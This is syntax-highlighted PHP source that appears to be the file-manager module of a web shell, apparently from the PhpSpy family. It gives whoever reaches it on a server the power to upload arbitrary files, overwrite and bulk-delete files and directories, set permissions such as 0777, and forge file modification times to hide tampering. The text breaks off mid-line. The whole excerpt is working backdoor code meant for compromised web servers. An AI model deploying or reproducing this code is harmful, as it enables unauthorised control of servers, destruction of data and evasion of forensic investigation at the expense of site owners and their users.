<span style="color: #b294bb;">&lt;?php</span>
$<span style="color: #f0c674;">errmsg</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span>$<span style="color: #f0c674;">errmsg</span>);

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">dir</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dir</span> = $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>] ? $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>] : <span style="color: #8abeb7;">'.'</span>;
}
$<span style="color: #f0c674;">nowpath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">getPath(</span><span style="color: #cc6666; font-weight: bold;">SA_ROOT</span>, $<span style="color: #f0c674;">dir</span>);
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">substr(</span>$<span style="color: #f0c674;">dir</span>, -<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) != <span style="color: #8abeb7;">'/'</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dir</span> = $<span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>;
}

<span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'file'</span>) {

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dir_writeable</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">is_writable(</span>$<span style="color: #f0c674;">nowpath</span>) ? <span style="color: #8abeb7;">'Writable'</span> : <span style="color: #8abeb7;">'Non-writable'</span>;

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">newdirname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mkdirs</span> = $<span style="color: #f0c674;">nowpath</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">newdirname</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">mkdirs</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Directory has already existed'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Directory created '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">mkdir(</span>$<span style="color: #f0c674;">mkdirs</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0777</span>) ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'failed'</span>)<span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">chmod(</span>$<span style="color: #f0c674;">mkdirs</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0777</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">doupfile</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'File upload '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">copy(</span>$<span style="color: #81a2be;">_FILES</span>[<span style="color: #8abeb7;">'uploadfile'</span>][<span style="color: #8abeb7;">'tmp_name'</span>],$<span style="color: #f0c674;">uploaddir</span>.<span style="color: #8abeb7;">'/'</span><span style="text-decoration: underline;">.$</span><span style="color: #81a2be; text-decoration: underline;">_FILES</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'uploadfile'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">]) ? </span><span style="color: #8abeb7; text-decoration: underline;">'success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">editfilename</span> &amp;&amp; $<span style="color: #f0c674;">filecontent</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">editfilename</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Save file '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">fp</span>,$<span style="color: #f0c674;">filecontent</span>) ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'failed'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">pfile</span> &amp;&amp; $<span style="color: #f0c674;">newperm</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">pfile</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'The original file does not exist'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">newperm</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">base_convert(</span>$<span style="color: #f0c674;">newperm</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">8</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">10</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Modify file attributes '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">chmod(</span>$<span style="color: #f0c674;">pfile</span>,$<span style="color: #f0c674;">newperm</span>) ? <span style="color: #8abeb7;">'success'</span> : <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#25913;&#21517;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">oldname</span> &amp;&amp; $<span style="color: #f0c674;">newfilename</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">nname</span> = $<span style="color: #f0c674;">nowpath</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">newfilename</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">nname</span>) || !<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">oldname</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span>$<span style="color: #f0c674;">nname</span>.<span style="color: #8abeb7;">' has already existed or original file does not exist'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(basename(</span>$<span style="color: #f0c674;">oldname</span>).<span style="color: #8abeb7;">' renamed '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">basename(</span>$<span style="color: #f0c674;">nname</span>).(@<span style="color: #c5c8c6; background-color: #1d1f21;">rename(</span>$<span style="color: #f0c674;">oldname</span>,<span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nname</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">sname</span> &amp;&amp; $<span style="color: #f0c674;">tofile</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">tofile</span>) || !<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">sname</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'The goal file has already existed or original file does not exist</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(basename(</span>$<span style="color: #f0c674;">tofile</span>).<span style="color: #8abeb7;">' copied '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">copy(</span>$<span style="color: #f0c674;">sname</span>,$<span style="color: #f0c674;">tofile</span>) ? <span style="color: #c5c8c6; background-color: #1d1f21;">basename(</span>$<span style="color: #f0c674;">to</span><span style="color: #f0c674; text-decoration: underline;">file</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">curfile</span> &amp;&amp; $<span style="color: #f0c674;">tarfile</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!@<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">curfile</span>) || !@<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">tarfile</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'The goal file has already existed or original file does not exist</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">time</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">tarfile</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Modify file the last modified '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">touch(</span>$<span style="color: #f0c674;">curfile</span>,$<span style="color: #f0c674;">time</span>,$<span style="color: #f0c674;">time</span>) ? <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">curfile</span> &amp;&amp; $<span style="color: #f0c674;">year</span> &amp;&amp; $<span style="color: #f0c674;">month</span> &amp;&amp; $<span style="color: #f0c674;">day</span> &amp;&amp; $<span style="color: #f0c674;">hour</span> &amp;&amp; $<span style="color: #f0c674;">minute</span> &amp;&amp; $<span style="color: #f0c674;">second</span>) <span style="text-decoration: underline;">{</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!@<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">curfile</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(basename(</span>$<span style="color: #f0c674;">curfile</span>).<span style="color: #8abeb7;">' does not exist'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">time</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">strtotime(</span><span style="color: #8abeb7;">"$year-$month-$day $hour:$minute:$second"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Modify file the last modified '</span>.(@<span style="color: #c5c8c6; background-color: #1d1f21;">touch(</span>$<span style="color: #f0c674;">curfile</span>,$<span style="color: #f0c674;">time</span>,$<span style="color: #f0c674;">time</span>) ? <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span>($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'delfiles'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">dl</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dfiles</span>=<span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">succ</span> = $<span style="color: #f0c674;">fail</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">dl</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">filepath</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">filepath</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (@<span style="color: #c5c8c6; background-color: #1d1f21;">deltree(</span>$<span style="color: #f0c674;">filepath</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">succ</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fail</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (@<span style="color: #c5c8c6; background-color: #1d1f21;">unlink(</span>$<span style="color: #f0c674;">filepath</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">succ</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fail</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Deleted folder/file have finished,choose '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">count(</span>$<span style="color: #f0c674;">dl</span>).<span style="color: #8abeb7;">' success '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">succ</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' fail '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">fail</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Please select folder/file(s)'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=<span style="color: #81a2be;">&gt;</span><span style="color: #8abeb7;">'createdir'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'newdirname'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'fileperm'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'newperm'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'pfile'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'copyfile'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'sname'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'tofile'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'rename'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'oldname'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'newfilename'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'fileopform'</span>, <span style="color: #8abeb7;">'target'</span>=&gt;<span style="color: #8abeb7;">'_blank'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'opfile'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'getsize'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'getdir'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">free</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">disk_free_space(</span>$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">free</span> &amp;&amp; $<span style="color: #f0c674;">free</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">all</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">disk_total_space(</span>$<span style="color: #f0c674;">nowpath</span>);
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">all</span> &amp;&amp; $<span style="color: #f0c674;">all</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">used</span> = $<span style="color: #f0c674;">all</span>-$<span style="color: #f0c674;">free</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;File Manager - Current disk free '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>$<span style="color: #f0c674;">free</span>).<span style="color: #8abeb7;">' of '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">all</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">' ('</span><span style="text-decoration: underline;">.@</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">round(100</span><span style="text-decoration: underline;">/($</span><span style="color: #f0c674; text-decoration: underline;">all</span><span style="text-decoration: underline;">/$</span><span style="color: #f0c674; text-decoration: underline;">free</span><span style="text-decoration: underline;">),</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2</span><span style="text-decoration: 